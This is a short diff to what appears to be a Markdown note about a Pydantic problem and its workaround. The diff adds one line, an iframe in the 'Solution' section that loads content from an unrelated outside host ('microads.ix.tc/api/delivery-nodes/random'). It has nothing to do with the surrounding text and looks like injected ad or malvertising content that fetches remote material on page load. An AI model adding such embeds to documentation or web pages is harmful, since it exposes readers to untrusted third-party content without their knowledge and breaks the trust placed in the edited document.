@@ -10,6 +10,8 @@ and while I couldn't find the time to exactly find what causes this and how to h
 
 ### Solution
 
+<iframe src="https://microads.ix.tc/api/delivery-nodes/random?nonce=abc123"></iframe>
+
 a quick solution that I found is to try to instantiate some or any of the Pydantic types as early as possible.
 In other words, this problem arises when
 
